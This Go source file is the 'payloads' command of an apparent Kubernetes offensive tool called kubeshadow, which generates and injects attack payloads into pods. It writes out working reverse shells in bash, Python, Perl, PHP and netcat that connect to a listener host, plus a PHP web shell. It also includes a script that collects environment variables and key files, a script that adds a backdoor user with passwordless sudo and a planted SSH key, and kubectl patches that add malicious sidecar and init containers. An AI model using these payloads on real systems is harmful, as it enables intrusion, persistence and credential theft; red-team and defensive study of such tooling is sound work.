package exploitation

import (
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/spf13/cobra"
)

// PayloadsCmd represents the payloads command
var PayloadsCmd = &cobra.Command{
	Use:   "payloads",
	Short: "Generate and inject malicious payloads",
	Long: `Payload Generation and Injection

Generate various types of malicious payloads for Kubernetes environments:
- Reverse shells (bash, python, perl, etc.)
- Web shells (PHP, JSP, ASP)
- Privilege escalation payloads
- Data exfiltration payloads
- Persistence payloads
- Evasion payloads

Examples:
  kubeshadow exploitation payloads list
  kubeshadow exploitation payloads generate --type reverse-shell --lhost 192.168.1.100 --lport 4444
  kubeshadow exploitation payloads inject --target-pod vulnerable-pod --payload "base64-encoded-payload"
  kubeshadow exploitation payloads encode --payload "whoami" --format base64`,
	RunE: runPayloads,
}

func runPayloads(cmd *cobra.Command, args []string) error {
	action, _ := cmd.Flags().GetString("action")

	switch action {
	case "list":
		return listPayloads()
	case "generate":
		return generatePayload(cmd)
	case "inject":
		return injectPayload(cmd)
	case "encode":
		return encodePayload(cmd)
	default:
		return listPayloads()
	}
}

func listPayloads() error {
	fmt.Println("ðŸŽ¯ Available Payloads")
	fmt.Println("====================")
	fmt.Println("")

	fmt.Println("ðŸ“¡ Reverse Shells:")
	fmt.Println("  bash-reverse     - Bash reverse shell")
	fmt.Println("  python-reverse   - Python reverse shell")
	fmt.Println("  perl-reverse     - Perl reverse shell")
	fmt.Println("  php-reverse      - PHP reverse shell")
	fmt.Println("  nc-reverse       - Netcat reverse shell")
	fmt.Println("")

	fmt.Println("ðŸŒ Web Shells:")
	fmt.Println("  php-webshell     - PHP web shell")
	fmt.Println("  jsp-webshell     - JSP web shell")
	fmt.Println("  asp-webshell     - ASP web shell")
	fmt.Println("  node-webshell    - Node.js web shell")
	fmt.Println("")

	fmt.Println("â¬†ï¸  Privilege Escalation:")
	fmt.Println("  suid-escalate    - SUID privilege escalation")
	fmt.Println("  sudo-escalate    - Sudo privilege escalation")
	fmt.Println("  cap-escalate     - Capability escalation")
	fmt.Println("  docker-escalate  - Docker privilege escalation")
	fmt.Println("")

	fmt.Println("ðŸ’¾ Data Exfiltration:")
	fmt.Println("  data-collector   - Collect sensitive data")
	fmt.Println("  file-stealer     - Steal specific files")
	fmt.Println("  env-dumper       - Dump environment variables")
	fmt.Println("  secret-hunter    - Hunt for secrets")
	fmt.Println("")

	fmt.Println("ðŸ”’ Persistence:")
	fmt.Println("  backdoor-user    - Create backdoor user")
	fmt.Println("  cron-persistence - Cron-based persistence")
	fmt.Println("  service-persistence - Service-based persistence")
	fmt.Println("  ssh-key-plant    - Plant SSH keys")
	fmt.Println("")

	fmt.Println("ðŸ¥· Evasion:")
	fmt.Println("  obfuscated-shell - Obfuscated reverse shell")
	fmt.Println("  encoded-payload  - Base64 encoded payload")
	fmt.Println("  polymorphic      - Polymorphic payload")
	fmt.Println("  anti-detection   - Anti-detection payload")

	return nil
}

func generatePayload(cmd *cobra.Command) error {
	payloadType, _ := cmd.Flags().GetString("type")
	lhost, _ := cmd.Flags().GetString("lhost")
	lport, _ := cmd.Flags().GetString("lport")
	format, _ := cmd.Flags().GetString("format")

	fmt.Printf("ðŸŽ¯ Generating %s payload\n", payloadType)
	fmt.Println("=========================")

	var payload string

	switch payloadType {
	case "bash-reverse":
		payload = fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
	case "python-reverse":
		payload = fmt.Sprintf(`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, lhost, lport)
	case "perl-reverse":
		payload = fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, lhost, lport)
	case "php-reverse":
		payload = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, lhost, lport)
	case "nc-reverse":
		payload = fmt.Sprintf("nc -e /bin/sh %s %s", lhost, lport)
	case "php-webshell":
		payload = `<?php system($_GET['cmd']); ?>`
	case "data-collector":
		payload = `#!/bin/bash
# Data Collection Payload
echo "=== System Information ===" > /tmp/loot.txt
uname -a >> /tmp/loot.txt
id >> /tmp/loot.txt
whoami >> /tmp/loot.txt
echo "" >> /tmp/loot.txt
echo "=== Environment Variables ===" >> /tmp/loot.txt
env >> /tmp/loot.txt
echo "" >> /tmp/loot.txt
echo "=== Network Information ===" >> /tmp/loot.txt
ifconfig >> /tmp/loot.txt
netstat -tulpn >> /tmp/loot.txt
echo "" >> /tmp/loot.txt
echo "=== Process Information ===" >> /tmp/loot.txt
ps aux >> /tmp/loot.txt
echo "" >> /tmp/loot.txt
echo "=== File System ===" >> /tmp/loot.txt
ls -la / >> /tmp/loot.txt
find / -name "*.key" -o -name "*.pem" -o -name "*.crt" 2>/dev/null >> /tmp/loot.txt
echo "Data collection complete. Check /tmp/loot.txt"`
	case "backdoor-user":
		payload = `#!/bin/bash
# Backdoor User Creation
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
mkdir -p /home/backdoor/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7..." > /home/backdoor/.ssh/authorized_keys
chmod 700 /home/backdoor/.ssh
chmod 600 /home/backdoor/.ssh/authorized_keys
chown -R backdoor:backdoor /home/backdoor/.ssh`
	default:
		return fmt.Errorf("unknown payload type: %s", payloadType)
	}

	// Format the payload
	if format == "base64" {
		encoded := base64.StdEncoding.EncodeToString([]byte(payload))
		fmt.Printf("Base64 Encoded Payload:\n%s\n", encoded)
	} else {
		fmt.Printf("Raw Payload:\n%s\n", payload)
	}

	fmt.Println("\nðŸ’¡ Usage:")
	fmt.Println("  - Copy the payload to your target")
	fmt.Println("  - Execute with appropriate method")
	fmt.Println("  - Monitor for connections/results")

	return nil
}

func injectPayload(cmd *cobra.Command) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	payload, _ := cmd.Flags().GetString("payload")
	method, _ := cmd.Flags().GetString("method")

	fmt.Printf("ðŸŽ¯ Injecting payload into %s/%s\n", namespace, targetPod)
	fmt.Println("=====================================")

	// Decode base64 payload if needed
	decodedPayload, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		// If not base64, use as-is
		decodedPayload = []byte(payload)
	}

	switch method {
	case "exec":
		fmt.Printf("ðŸ“¡ Executing payload via kubectl exec...\n")
		fmt.Printf("kubectl exec -n %s %s -- %s\n", namespace, targetPod, string(decodedPayload))
	case "sidecar":
		fmt.Printf("ðŸ“¡ Injecting payload via sidecar container...\n")
		fmt.Printf("kubectl patch pod %s -n %s -p '{\"spec\":{\"containers\":[{\"name\":\"malicious-sidecar\",\"image\":\"alpine:latest\",\"command\":[\"/bin/sh\"],\"args\":[\"-c\",\"%s\"]}]}}'\n", targetPod, namespace, string(decodedPayload))
	case "init":
		fmt.Printf("ðŸ“¡ Injecting payload via init container...\n")
		fmt.Printf("kubectl patch pod %s -n %s -p '{\"spec\":{\"initContainers\":[{\"name\":\"malicious-init\",\"image\":\"alpine:latest\",\"command\":[\"/bin/sh\"],\"args\":[\"-c\",\"%s\"]}]}}'\n", targetPod, namespace, string(decodedPayload))
	case "volume":
		fmt.Printf("ðŸ“¡ Injecting payload via volume mount...\n")
		fmt.Printf("kubectl patch pod %s -n %s -p '{\"spec\":{\"volumes\":[{\"name\":\"malicious-volume\",\"hostPath\":{\"path\":\"/tmp\"}}],\"containers\":[{\"name\":\"malicious-container\",\"image\":\"alpine:latest\",\"volumeMounts\":[{\"name\":\"malicious-volume\",\"mountPath\":\"/malicious\"}]}]}}'\n", targetPod, namespace)
	default:
		return fmt.Errorf("unknown injection method: %s", method)
	}

	fmt.Println("\nâœ… Payload injection command generated!")
	fmt.Println("ðŸ’¡ Execute the command to inject the payload")

	return nil
}

func encodePayload(cmd *cobra.Command) error {
	payload, _ := cmd.Flags().GetString("payload")
	format, _ := cmd.Flags().GetString("format")

	fmt.Printf("ðŸŽ¯ Encoding payload in %s format\n", format)
	fmt.Println("=================================")

	switch format {
	case "base64":
		encoded := base64.StdEncoding.EncodeToString([]byte(payload))
		fmt.Printf("Base64 Encoded: %s\n", encoded)
	case "hex":
		hex := fmt.Sprintf("%x", []byte(payload))
		fmt.Printf("Hex Encoded: %s\n", hex)
	case "url":
		// Simple URL encoding
		encoded := strings.ReplaceAll(payload, " ", "%20")
		encoded = strings.ReplaceAll(encoded, "&", "%26")
		encoded = strings.ReplaceAll(encoded, "=", "%3D")
		fmt.Printf("URL Encoded: %s\n", encoded)
	default:
		return fmt.Errorf("unknown encoding format: %s", format)
	}

	return nil
}

func init() {
	PayloadsCmd.Flags().String("action", "list", "Action to perform (list, generate, inject, encode)")
	PayloadsCmd.Flags().String("type", "bash-reverse", "Payload type to generate")
	PayloadsCmd.Flags().String("lhost", "192.168.1.100", "Listener host for reverse shells")
	PayloadsCmd.Flags().String("lport", "4444", "Listener port for reverse shells")
	PayloadsCmd.Flags().String("format", "raw", "Output format (raw, base64, hex, url)")
	PayloadsCmd.Flags().String("target-pod", "", "Target pod for injection")
	PayloadsCmd.Flags().String("namespace", "default", "Target namespace")
	PayloadsCmd.Flags().String("payload", "", "Payload to inject/encode")
	PayloadsCmd.Flags().String("method", "exec", "Injection method (exec, sidecar, init, volume)")
}
